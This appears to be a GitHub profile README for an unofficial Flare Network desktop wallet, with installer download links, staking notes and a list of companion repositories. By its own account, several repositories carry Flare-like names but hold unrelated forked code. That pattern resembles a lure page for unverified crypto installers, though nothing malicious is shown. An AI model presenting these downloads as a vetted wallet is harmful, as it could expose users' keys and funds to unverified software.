![Flare Wallet](assets/banner-profile.png)

# Flare Wallet

A self-custody desktop wallet for Flare Network, built for people who would rather verify a hash than trust a logo.

<p align="center"><a href="https://github.com/flarewallet/flare-desktop-wallet/blob/add-posthog/LICENSE.md"><img src="assets/badge-license.svg" alt="License"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02"><img src="assets/badge-release.svg" alt="Release"></a></p>

## Downloads - v1.3.02

<p align="center"><a href="https://github.com/flarewallet/flare-desktop-wallet/releases/download/v1.3.02/flare-wallet-desktop-windows-v1.3.02.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/download/v1.3.02/flare-wallet-desktop-macos-v1.3.02.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/download/v1.3.02/flare-wallet-desktop-linux-v1.3.02.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`flare-wallet-desktop-windows-v1.3.02.exe`](https://github.com/flarewallet/flare-desktop-wallet/releases/download/v1.3.02/flare-wallet-desktop-windows-v1.3.02.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`flare-wallet-desktop-macos-v1.3.02.dmg`](https://github.com/flarewallet/flare-desktop-wallet/releases/download/v1.3.02/flare-wallet-desktop-macos-v1.3.02.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`flare-wallet-desktop-linux-v1.3.02.zip`](https://github.com/flarewallet/flare-desktop-wallet/releases/download/v1.3.02/flare-wallet-desktop-linux-v1.3.02.zip) |

## What Flare Wallet does

Flare Wallet runs on your own computer and holds your keys there, encrypted. It holds FLR, WFLR and FXRP in one portfolio, so the token you delegate and the asset you bridged from XRP sit beside the native coin instead of in three different places.

It stakes on the P-Chain and delegates WFLR to FTSO providers, which are two different jobs with two different clocks: a stake is locked to a validator for at least 14 days and needs 50,000 FLR, while delegation builds rewards across 3.5-day epochs and can be claimed for 90 days before the network takes the rest. The wallet shows both, and estimates the fee before you sign.

Chain ID 14 and Flare's public RPC are configured at install. You do not add a network to use this wallet. Manual network fields are for putting Flare into something else.

There is no account, no server and no recovery desk. That is the point, and it is also the trade: the recovery phrase is the only way back in, and no one can reverse a transaction you signed.

## Guides by need

| Need | Repository | Start with |
| --- | --- | --- |
| Install, update, back up or log in | [flare-wallet-guide](https://github.com/flarewallet/flare-wallet-guide) | [Flare Wallet download](https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-download.md) |
| Stake, delegate or hold FXRP | [flare-wallet-staking](https://github.com/flarewallet/flare-wallet-staking) | [Flare Wallet staking](https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-staking.md) |
| Check safety, scams or a sync fault | [flare-wallet-security](https://github.com/flarewallet/flare-wallet-security) | [is Flare Wallet safe](https://github.com/flarewallet/flare-wallet-security/blob/HEAD/is-flare-wallet-safe.md) |
| Install it and check the file | [flare-desktop-wallet](https://github.com/flarewallet/flare-desktop-wallet) | The release table and the SHA-256 list |
| See how the interface was assembled | [flare-viem-starter](https://github.com/flarewallet/flare-viem-starter) | A three-file Vue shell |
| Understand XRP-side account setup | [fdc-client](https://github.com/flarewallet/fdc-client) | The Flexrp setup tool and its warning |
| Watch live XRP traffic | [tx-verifier](https://github.com/flarewallet/tx-verifier) | A canvas rendering of network transactions |
| Consume transactions in code | [flare-systems-deployment](https://github.com/flarewallet/flare-systems-deployment) | A callback per transaction, three chains |
| Flatten nested chain data | [flare-smart-accounts](https://github.com/flarewallet/flare-smart-accounts) | A tested Stellar data helper |

## Popular questions

### Is this the wallet Flare Foundation recommends?

Flare Foundation publishes its own wallet directory, and Flare Wallet is not part of it. This is an independent product with its own release page. If a page tells you otherwise, it is not ours.

### Why does the wallet already know about Flare?

Because chain ID 14 is set at install. A fresh install opens on Flare mainnet with the public RPC already in place. Adding a network manually is only needed when you put Flare into a different wallet.

### What happens if I lose my recovery phrase?

The wallet cannot restore access, and neither can anyone else. The phrase is the account. Write it down before you fund the wallet, and test that it restores before you rely on it.

### Does the wallet take a cut of staking rewards?

The wallet is free to use. Flare's own rules govern the rewards: delegation awards are paid in FLR, and unclaimed delegation rewards stop being claimable after 90 days. Fees you pay are network fees, which Flare burns.

### Why do the other repositories look like other projects?

Because they are. Several were forked from unrelated upstream code and kept under this account: a transaction streamer, a Stellar data helper, a Vue component. Their pages say so at the top rather than dressing them up as Flare software. The wallet and the release page are the product.

## Repositories

- [flare-desktop-wallet](https://github.com/flarewallet/flare-desktop-wallet) is the application and the only place the installers are published, tagged `v1.3.02`.
- [flare-viem-starter](https://github.com/flarewallet/flare-viem-starter) is a three-file Vue 2 shell with Bootstrap-Vue and a websocket mixin, kept as a readable example of the interface shape.
- [fdc-client](https://github.com/flarewallet/fdc-client) carries Flexrp, the 2020-2021 desktop tool that set up an XRP account for the Spark distribution, by Dev Null Productions.
- [flare-systems-deployment](https://github.com/flarewallet/flare-systems-deployment) holds the `blks` transaction streamer, which streams XRP, Stellar and VeChain transactions to a callback.
- [flare-smart-accounts](https://github.com/flarewallet/flare-smart-accounts) holds `ezxlm`, a tested Stellar data structure helper rather than Flare account abstraction.
- [flare-wallet-guide](https://github.com/flarewallet/flare-wallet-guide) holds eight pages on install, requirements, update, backup, login, uninstall and the passphrase question.
- [flare-wallet-staking](https://github.com/flarewallet/flare-wallet-staking) holds seven pages on staking, delegation, WFLR, FXRP, claim timing, network settings and addresses.
- [flare-wallet-security](https://github.com/flarewallet/flare-wallet-security) holds six pages on safety, scam shapes, Ledger, sync failures, support and how it compares.
- [tx-verifier](https://github.com/flarewallet/tx-verifier) holds `vue-xrp-waterfall`, a Vue component that renders live XRP transactions, under the MIT licence.

Flare Wallet is independent of Flare Foundation, Flare Labs and Ava Labs. The desktop source is distributed under the BSD 3-Clause licence published in its `LICENSE.md`, which names Ava Labs, Inc. as the copyright holder. Flare, FLR, WFLR, FXRP, FAssets and FTSO are referenced to describe compatibility only.
